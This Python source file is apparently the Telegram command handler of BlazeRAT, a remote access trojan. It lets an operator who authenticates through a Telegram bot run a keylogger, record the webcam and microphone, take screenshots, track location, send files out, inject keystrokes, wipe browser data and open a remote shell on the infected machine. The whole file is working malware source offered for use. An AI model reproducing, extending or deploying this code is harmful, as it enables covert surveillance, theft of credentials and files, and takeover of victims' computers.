#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
import telebot # pip3 install pyTelegramBotAPI
from time import time, ctime, sleep
# Import helpers
import core.logger as Logger
import core.messages as Messages
import core.database as Database
import core.banned as BanManager
from config import token, auth_expire_time
from core.tokens import VerifyToken, EnumeratePermissions
# Import command modules
import services.wipe as Wipe
import services.power as Power
import services.startup as Autorun
import services.filemanager as Files
import services.volume as VolumeLevel
import services.shell as SystemCommand
import services.keylogger as Keylogger
import services.keyboard as Keyboard
import services.transfer as FileTransfer
import services.location as TrackLocation
import services.information as SystemInfo
import services.webcamera as WebcamRecorder
import services.taskmanager as ProcessManager
import services.screenshot as DesktopScreenshot
import services.microphone as MicrophoneRecorder

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed to receive commands from the telegram bot
    and process them.
"""

# Bot
bot = telebot.TeleBot(token)

""" Help """
@bot.message_handler(commands=["help"])
def Help(message):
    bot.reply_to(message, Messages.user.help, parse_mode="Markdown")

""" Authorize user """
@bot.message_handler(commands=["authorize"])
def Authorize(message):
    token = message.text[11:]
    chatid = message.chat.id
    username = message.chat.username
    username = Messages.user.name_anonymous if username is None else username
    # Prevent authorization if user is banned
    ban_state, reason = BanManager.UserIsBanned(chatid)
    if ban_state is True:
        return bot.send_message(chatid, Messages.auth.user_is_banned % reason)
    # If user is already authorized
    if Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.already_authorized)
    # Check user auth password
    verify_state, name = VerifyToken(token)
    if verify_state is True:
        # Log user auth event
        Logger.Log(f"Auth >> Logged in successfully using token {name}", chatid)
        # Delete message with token
        bot.delete_message(chatid, message.message_id)
        # Get session expire time
        expire = ctime(time() + auth_expire_time)
        # Insert user to database
        Database.AuthorizeUser(chatid, name)
        bot.send_message(chatid, Messages.auth.user_authorized % (username, name, expire))
    else:
        attempts = BanManager.GetAttempts(chatid)
        # Ban user
        if attempts == 0:
            Logger.Log(f"Auth >> User banned, reason: 'Token bruteforce'", chatid)
            BanManager.BanUser(chatid, username, True, "Token bruteforce")
            bot.send_message(chatid, Messages.auth.user_is_banned % "Bruteforce")
        else:
            attempts -= 1
            Logger.Log(f"Auth >> Failed log in using token {token}, attempt left {attempts}", chatid)
            BanManager.SetAttempts(chatid, username, attempts)
            bot.send_message(chatid, Messages.auth.incorrect_token % attempts)

""" Deauthorize user """
@bot.message_handler(commands=["deauthorize"])
def Deauthorize(message):
    chatid = message.chat.id
    username = message.chat.username
    username = Messages.user.name_anonymous if username is None else username
    # If user is not authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Deauthorize user
    Logger.Log(f"Auth >> User logged out", chatid)
    Database.DeauthorizeUser(chatid)
    bot.send_message(chatid, Messages.auth.user_deauthorized % username)

""" Get permissions list """
@bot.message_handler(commands=["permissions"])
def Permissions(message):
    chatid = message.chat.id
    # If user is not authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Log
    Logger.Log(f"Command >> Get permissions", chatid)
    # Get perms list
    token = Database.GetUserToken(chatid)
    perms = EnumeratePermissions(token, False, False)
    bot.send_message(chatid, "💎 " + perms)

""" Get system information """
@bot.message_handler(commands=["information"])
def Information(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "INFORMATION"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Log
    Logger.Log(f"Command >> Get system info", chatid)
    # Create microphone controller keyboard
    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        telebot.types.InlineKeyboardButton(text="▶️ RAM", callback_data="INFO_RAM"),
        telebot.types.InlineKeyboardButton(text="▶️ Boot", callback_data="INFO_BOOT"),
        telebot.types.InlineKeyboardButton(text="▶️ Disks", callback_data="INFO_DISK"),
        telebot.types.InlineKeyboardButton(text="▶️ System", callback_data="INFO_SYS"),
        telebot.types.InlineKeyboardButton(text="▶️ Processor", callback_data="INFO_CPU"),
    )
    bot.send_message(chatid, "⚙️ System information:", reply_markup=markup)


""" Send desktop screenshot """
@bot.message_handler(commands=["screenshot"])
def Screenshot(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "SCREENSHOT"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Log
    Logger.Log(f"Screenshot >> Get desktop screenshot", chatid)
    # Create desktop screenshot & send to user
    bot.send_chat_action(chatid, "upload_photo")
    screenshot = DesktopScreenshot.Capture()
    bot.send_photo(
        chat_id=chatid, photo=screenshot,
        reply_to_message_id=message.message_id,
        caption=Messages.services.desktop_screenshot_captured
    )

""" Send webcam video """
@bot.message_handler(commands=["webcam"])
def Webcam(message):
    chatid = message.chat.id
    # Get webcam device index
    try:
        device = str(int(message.text[7:]) - 1)
    except:
        device = "0"
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "WEBCAMERA"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Create webcam controller keyboard
    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        telebot.types.InlineKeyboardButton(text=Messages.services.webcam_screenshot_button, callback_data="TakeWebcamScreenshot_" + device),
        telebot.types.InlineKeyboardButton(text=Messages.services.webcam_start_recording_button, callback_data="EnableWebcam_" + device),
        telebot.types.InlineKeyboardButton(text=Messages.services.webcam_stop_recording_button, callback_data="DisableWebcam")
    )
    bot.send_message(chatid, Messages.services.webcam_select_action % int(device), reply_markup=markup)

""" Record audio from microphone """
@bot.message_handler(commands=["microphone"])
def Microphone(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "MICROPHONE"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Create microphone controller keyboard
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton(text=Messages.services.microphone_start_recording_button, callback_data="EnableMicrophone"),
        telebot.types.InlineKeyboardButton(text=Messages.services.microphone_stop_recording_button, callback_data="DisableMicrophone")
    )
    bot.send_message(chatid, Messages.services.microphone_select_action, reply_markup=markup)

""" Change system audio volume """
@bot.message_handler(commands=["volume"])
def Volume(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "VOLUME"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Create volume controller keyboard
    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    markup.add(telebot.types.InlineKeyboardButton(text=Messages.services.volume_get_level_button % VolumeLevel.Get() + "%", callback_data="VL_GET"))
    # Add set level option from 0 to 100
    for lvl in range(0, 110, 10):
        markup.add(telebot.types.InlineKeyboardButton(text=Messages.services.volume_set_level_button % lvl + "%", callback_data="VL_" + str(lvl)))

    bot.send_message(chatid, "🔈 Volume control:", reply_markup=markup)

""" Keylogger """
@bot.message_handler(commands=["keylogger"])
def Keylogger(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "KEYLOGGER"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Create keylogger controller keyboard
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton(text=Messages.services.keylogger_start_recording_button, callback_data="EnableKeylogger"),
        telebot.types.InlineKeyboardButton(text=Messages.services.keylogger_stop_recording_button, callback_data="DisableKeylogger"),
        telebot.types.InlineKeyboardButton(text=Messages.services.keylogger_get_logs_button, callback_data="GetDataKeylogger"),
        telebot.types.InlineKeyboardButton(text=Messages.services.keylogger_clean_logs_button, callback_data="CleanKeylogger")
    )
    bot.send_message(chatid, Messages.services.microphone_select_action, reply_markup=markup)

""" Send key press """
@bot.message_handler(commands=["keyboard"])
def KeyboardCtrl(message):
    text = message.text[10:]
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "KEYBOARD"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)

    # Send special keys list
    if not text:
        Keyboard.SendKeyboard(chatid, bot)
    else:
        # Send key press
        Keyboard.SendKeyText(text, chatid)

""" Power control """
@bot.message_handler(commands=["power"])
def PowerCtrl(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "POWER"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Create power controller keyboard
    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        telebot.types.InlineKeyboardButton(text=Messages.services.power_shutdown, callback_data="POWER_SHUTDOWN"),
        telebot.types.InlineKeyboardButton(text=Messages.services.power_suspend, callback_data="POWER_SUSPEND"),
        telebot.types.InlineKeyboardButton(text=Messages.services.power_reboot, callback_data="POWER_REBOOT"),
        telebot.types.InlineKeyboardButton(text=Messages.services.power_logout, callback_data="POWER_LOGOUT"),
    )
    bot.send_message(chatid, Messages.services.power_control, reply_markup=markup)

""" Get location by BSSID """
@bot.message_handler(commands=["location"])
def Location(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "LOCATION"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Try to get device location
    TrackLocation.SendLocation(message, bot)

""" Files control """
@bot.message_handler(commands=["filemanager"])
def Filemanager(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "FILEMANAGER"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Control files
    Files.Filemanager(chatid, bot)


""" Task manager """
@bot.message_handler(commands=["taskmanager"])
def TaskManager(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "TASKMANAGER"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Send process controls
    ProcessManager.ShowProcesses(message, bot)

""" Download files or directories to telegram bot """
@bot.message_handler(commands=["download"])
def DownloadFile(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "FILETRANSFER"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Send file to telegram bot
    bot.send_chat_action(chatid, "upload_document")
    FileTransfer.SendFile(message, bot)

""" Upload files to device """
@bot.message_handler(content_types=["document"])
def UploadFile(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "FILETRANSFER"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Save file on device
    bot.send_chat_action(chatid, "upload_document")
    FileTransfer.ReceiveFile(message, bot)


""" Wipe browsers data """
@bot.message_handler(commands=["wipe"])
def WipeBrowserData(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "WIPE"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Execute wipe command
    Wipe.WipeBrowserDataInfo(message, bot)


""" Uninstall agent """
@bot.message_handler(commands=["uninstall"])
def Uninstall(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "UNINSTALL"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Log
    Logger.Log(f"Command >> Uninstall service", chatid)
    # Execute commands
    bot.send_message(chatid, Messages.services.stub_uninstall)
    Autorun.ServiceUninstall()

""" Toggle command shell session for chatid """
@bot.message_handler(commands=["shell"])
def ToggleShell(message):
    chatid = message.chat.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "SHELL"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Send shell session state
    bot.send_chat_action(chatid, "typing")
    state = SystemCommand.ToggleSession(chatid)
    bot.reply_to(message, state)

""" Execute shell commands """
@bot.message_handler(func=lambda message: True, content_types=["text"])
def ExecuteShell(message):
    chatid = message.chat.id
    command = message.text
    # Check if session exists
    if not SystemCommand.SessionExists(chatid):
        return
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)
    # Check if token have permissions to do this
    if not Database.UserContainsPermission(chatid, "SHELL"):
        return bot.send_message(chatid, Messages.auth.permission_not_found)
    # Run commands
    bot.send_chat_action(chatid, "typing")
    output = SystemCommand.Run(command, chatid)
    if output != None:
        bot.reply_to(message, output)

""" Events handler """
@bot.callback_query_handler(func=lambda c:True)
def KeyboardActions(callback):
    text = callback.data
    chatid = callback.from_user.id
    # Check if user authorized
    if not Database.UserIsAuthorized(chatid):
        return bot.send_message(chatid, Messages.auth.not_authorized)

    # Microphone controls
    if "Microphone" in text:
        # Check if token have permissions to do this
        if not Database.UserContainsPermission(chatid, "MICROPHONE"):
            return bot.send_message(chatid, Messages.auth.permission_not_found)
        # Handle microphone command
        MicrophoneRecorder.Handle(callback, bot)

    # Webcam controls
    elif "Webcam" in text:
        # Check if token have permissions to do this
        if not Database.UserContainsPermission(chatid, "WEBCAMERA"):
            return bot.send_message(chatid, Messages.auth.permission_not_found)
        # Handle webcam command
        WebcamRecorder.Handle(callback, bot)

    # Keylogger controls
    elif "Keylogger" in text:
        # Check if token have permissions to do this
        if not Database.UserContainsPermission(chatid, "KEYLOGGER"):
            return bot.send_message(chatid, Messages.auth.permission_not_found)
        # Handle keylogger command
        Keylogger.Handle(callback, bot)

    # Filemanager controls
    elif text[:2] in ("FA", "FC"):
        # Check if token have permissions to do this
        if not Database.UserContainsPermission(chatid, "FILEMANAGER"):
            return bot.send_message(chatid, Messages.auth.permission_not_found)
        # Handle filemanager command
        if text[:2] == "FA":
            Files.OpenFileActionsMenu(callback, bot)
        elif text[:2] == "FC":
            Files.MakeFileAction(callback, bot)

    # System info
    elif text[:4] == "INFO":
        # Check if token have permissions to do this
        if not Database.UserContainsPermission(chatid, "INFORMATION"):
            return bot.send_message(chatid, Messages.auth.permission_not_found)
        # Handle system info command
        SystemInfo.Handle(callback, bot)
    # Process manager
    elif text[:2] == "TM":
        # Check if token have permissions to do this
        if not Database.UserContainsPermission(chatid, "TASKMANAGER"):
            return bot.send_message(chatid, Messages.auth.permission_not_found)
        # Handle taskmanager command
        ProcessManager.KillProcess(callback, bot)
    # Volume control
    elif text[:2] == "VL":
        # Check if token have permissions to do this
        if not Database.UserContainsPermission(chatid, "VOLUME"):
            return bot.send_message(chatid, Messages.auth.permission_not_found)
        # Get level
        if "GET" in text:
            return bot.send_message(chatid, Messages.services.volume_get_level % VolumeLevel.Get() + "%")
        else:
            # Set level
            level = int(text.split("_")[-1])
            VolumeLevel.SetVolume(level)
            return bot.send_message(chatid, Messages.services.volume_set_level % level + "%")
    # Power control
    elif text[:5] == "POWER":
        # Check if token have permissions to do this
        if not Database.UserContainsPermission(chatid, "POWER"):
            return bot.send_message(chatid, Messages.auth.permission_not_found)
        # Handle taskmanager command
        Power.Handle(callback, bot)
    # Keyboard special keys
    elif text[:6] == "SNDKEY":
        # Check if token have permissions to do this
        if not Database.UserContainsPermission(chatid, "KEYBOARD"):
            return bot.send_message(chatid, Messages.auth.permission_not_found)
        Keyboard.SendKeyPress(text.split("_")[-1], chatid)
    # Wipe browsers data
    elif text[:4] == "Wipe":
        # Check if token have permissions to do this
        if not Database.UserContainsPermission(chatid, "WIPE"):
            return bot.send_message(chatid, Messages.auth.permission_not_found)
        # Log
        Logger.Log(f"Command >> Wipe browsers data", chatid)
        # Wipe
        Wipe.WipeBrowserData(callback, bot)

""" Run telegram bot """
def Run():
    print("[~] Telegram Bot starting...")
    try:
        print("[?] Started as @" + bot.get_me().username)
    except Exception as error:
        exit(f"[!] Failed connect to telegram bot\n{error}")
    else:
        while True:
            try:
                bot.polling(none_stop=True)
            except Exception as error:
                print(error)
                sleep(2)
                

